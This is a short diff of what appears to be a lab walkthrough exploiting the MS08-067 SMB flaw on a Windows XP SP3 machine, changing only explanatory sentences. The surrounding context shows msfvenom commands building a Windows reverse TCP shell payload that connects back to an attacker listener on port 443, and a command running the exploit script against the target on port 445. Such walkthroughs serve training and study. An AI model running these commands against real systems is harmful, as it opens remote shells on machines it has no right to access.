@@ -253,13 +253,13 @@ And of course we need to generate a payload.
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 ```
 
-So trying again with a listen on port 443:
+Generating the payload:
 
 ```
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 ```
 
-After replacing the payload, let's try option 6 for SP3 English:
+After adding the new payload to the script, we're ready to execute.  Let's try option 6 for SP3 English:
 
 ```
 # python ms08_067_2018.py 10.10.10.4 6 445                                                                                                                                               
